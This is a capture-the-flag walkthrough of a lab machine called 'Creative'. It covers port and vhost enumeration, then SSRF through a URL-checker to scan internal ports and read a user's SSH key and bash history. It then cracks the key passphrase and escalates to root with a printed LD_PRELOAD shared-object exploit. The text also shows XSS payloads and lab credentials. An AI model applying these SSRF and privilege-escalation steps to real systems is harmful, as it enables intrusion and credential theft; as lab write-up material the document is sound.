# Creative - Easy

* Scan the machine - ```nmap -T4 -p- -A -Pn -v 10.10.10.64``` -

  * 22/tcp - ssh - OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
  * 80/tcp - http - nginx 1.18.0 (Ubuntu)

* From ```nmap```, we can also see that there is a domain name ```creative.thm``` - we can add this to the ```/etc/hosts``` file

* We can do a ```nikto``` scan as well - ```nikto -h 10.10.10.64``` - but this does not give us anything

* Basic directory scanning and vhost enumeration:

  ```shell
  gobuster dir -u http://creative.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,bak -t 16

  gobuster dir -u http://creative.thm/assets -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,bak -t 16

  ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://creative.thm -H 'Host:FUZZ.creative.thm' -fs 178
  # vhost fuzzing, run once to know what size to filter with
  # we get a hit here
  ```

* From the directory scanning, we only get a few hits - '/assets', '/components.html'

* Interacting in '/components.html', we do not get anything interesting as there are no other links

* While fuzzing for vhosts, we get a vhost 'beta.creative.thm' - we can add this to ```/etc/hosts```

* The page 'beta.creative.thm' is a beta URL tester, and we have an input field which takes a URL as an input and checks if it's alive

* Intercepting with Burp Suite, we can see that upon submitting, a POST request is sent with the input fed to a 'url' parameter

* On entering a test URL, after loading for a long time, we just get a response that says 'Dead'. When we input other strings like text or even an IP address, we get the 'Dead' response immediately

* If we enter the URL <http://creative.thm> or <http://10.10.10.64> (which we know is alive), the page loads the skeleton of the website itself. This indicates that under the hood, it is definitely interacting with the URL value of the 'url' parameter

* We can test now for any SSRF-related vulnerabilities - if we start a listener using ```nc -nvlp 4444```, and input our URL in the field - <http://10.14.65.78:4444>, we can see the response headers in terminal. This means the target server is issuing a request in the backend, and we can abuse this by testing further SSRF payloads:

  ```sh
  curl -i -s -X POST "http://beta.creative.thm" -d "url=http://10.10.10.64"
  # we get the webpage because this URL is alive

  curl -i -s -X POST "http://beta.creative.thm" -d "url=file:///etc/passwd"
  # we cannot read local files

  # need to with FTP and HTTP
  # start HTTP server
  vim index.html
  python3 -m http.server 8000

  # start FTP server
  sudo pip3 install twisted
  sudo python3 -m twisted ftp -p 21 -r .

  curl -i -s -X POST "http://beta.creative.thm" -d "url=ftp://10.14.65.78/index.html"
  # we cannot read files using FTP

  curl -i -s -X POST "http://beta.creative.thm" -d "url=http://10.14.65.78:8000/index.html"
  # but we can read files remotely
  ```

* Now, since we can reach our attacker machine by SSRF, we can build on this to get RCE.

* In the 'index.html' file, we notice that whatever content is added in file, it is simply shown in webpage by inserting it between ```<body>``` tags

* We can start with a simple HTML payload - this one is related to XSS:

  ```html
  <img src=x onerror=alert(1)>
  ```

* When the above is added in 'index.html' and we feed ```http://10.14.65.78:8000/index.html``` as the URL to be tested, we get an alert for '1', indicating the above worked. We can craft more such payloads:

  ```html
  <img src=x onerror=alert(1)>
  <img src=x onerror=alert(document.domain).jpg>
  <html><head></head><body><script>top.window.location = "http://creative.thm"</script></body></html>
  ```

  ```html
  <img src=x onerror=alert(1)>
  <img src=x onerror=alert(document.domain).jpg>
  <html><head></head><body><script>
          console.log("Test");
  </script></body></html>
  ```

* We can try getting RCE from SSRF, but the issue is that whenever the payload is added between ```<script>``` tags, it is not executed; we will have to find some other approach

* In the 'url' field, if we enter ```http://localhost:80```, we get the HTML code for ```creative.thm``` - this means it is hosted locally on port 80. We can also build on this to scan other ports for checking other internal services:

  ```shell
  curl -i -s -X POST "http://beta.creative.thm" -d "url=http://localhost:80"
  # HTML code for creative.thm

  curl -i -s -X POST "http://beta.creative.thm" -d "url=http://localhost:1"
  # for a port which is not hosting anything
  # we get the 'Dead' response with Content-Length 13

  for port in {1..65535};do echo $port >> ports.txt;done
  # ports wordlist

  # use tools like ffuf and wfuzz to enumerate all ports
  ffuf -w ports.txt:PORT -X POST -d "url=http://localhost:PORT" -fs 13 -u "http://beta.creative.thm"

  wfuzz -c -z file,ports.txt -d "url=http://localhost:FUZZ" --hh 13 http://beta.creative.thm
  # this gives us hits
  ```

* While we were unable to detect any open ports using ```ffuf```, ```wfuzz``` gave us an 'alive' response for ports 80 and 1337 (better to use multiple tools sometimes, as a single tool may give inaccurate details sometimes)

* Alternatively, to get the above info, we could have used an automated tool like [SSRFMap](https://github.com/swisskyrepo/SSRFmap) as well:

  ```sh
  git clone https://github.com/swisskyrepo/SSRFmap

  cd SSRFMap

  pip install -r requirements.txt

  python3 ssrfmap.py

  # capture a POST request using Burp and copy to file
  python3 ssrfmap.py -r ~/creative-post.req -p url -m portscan
  ```

* Now, in the URL field, if we give ```http://localhost:1337```, we are shown a page with directory listing for the Linux file system - this could be the target system

* We can click on each folder, but it acts as a link (e.g. - 'beta.creative.thm/home'), which does not exist - we have to instead define the directory initially, along with the URL:

  ```sh
  curl -i -s -X POST "http://beta.creative.thm" -d "url=http://localhost:1337/bin%40"
  # dead

  curl -i -s -X POST "http://beta.creative.thm" -d "url=http://localhost:1337/boot"

  curl -i -s -X POST "http://beta.creative.thm" -d "url=http://localhost:1337/home"
  # we have a user 'saad'

  curl -i -s -X POST "http://beta.creative.thm" -d "url=http://localhost:1337/home/saad"
  # we have some interesting stuff here like .bash_history and .ssh

  curl -i -s -X POST "http://beta.creative.thm" -d "url=http://localhost:1337/home/saad/.bash_history"
  # password reveal

  curl -i -s -X POST "http://beta.creative.thm" -d "url=http://localhost:1337/home/saad/.ssh"
  # we can get saad ssh key

  curl -i -s -X POST "http://beta.creative.thm" -d "url=http://localhost:1337/home/saad/.ssh/id_rsa"
  # copy this key
  ```

* The ```.bash_history``` file includes the credentials - "saad:MyStrongestPasswordYet$4291". Also, as we have saad's SSH key, we can use it for SSH login:

  ```sh
  ssh saad@creative.thm
  # cannot use the above creds, we need key

  vim id_rsa
  # paste saad key here

  chmod 600 id_rsa

  ssh saad@creative.thm -i id_rsa
  # it prompts for a passphrase, and the above password does not work

  # we can use ssh2john and try to crack hash
  ssh2john id_rsa > hash_id_rsa

  john --wordlist=/usr/share/wordlists/rockyou.txt hash_id_rsa
  # this cracks the hash and gives 'sweetness'

  ssh saad@creative.thm -i id_rsa
  ```

* After cracking ```id_rsa```, we can use the key and passphrase to login as 'saad' and get user flag

* ```.bash_history``` contains some more indicators - we have a couple of ```mysql``` logins for 'user' and 'db_user'; we can keep this in mind for privesc:

* We can check if we can run any commands as root user using ```sudo -l```, using the password we found earlier from ```.bash_history```. This shows we can run ```ping``` as root; we also have ```env_keep+=LD_PRELOAD``` variable set.

* This can be used as a privesc vector as ```LD_PRELOAD``` allows us o load a file before other libraries - in this case, we can use an exploit:

  ```c
  #include <stdio.h>
  #include <sys/types.h>
  #include <stdlib.h>

  void _init() {
      unsetenv("LD_PRELOAD");
      setgid(0);
      setuid(0);
      system("/bin/bash");
  }
  ```

  ```sh
  cd /tmp

  vim shell.c
  # add the exploit code

  gcc -fPIC -shared shell.c -o shell.so -nostartfiles
  # compile to create a .so file

  sudo LD_PRELOAD=/tmp/shell.so ping 127.0.0.1
  # use LD_PRELOAD with exploit
  # and we can run 'ping' as sudo so we need to do that

  # this gives us root shell
  ```
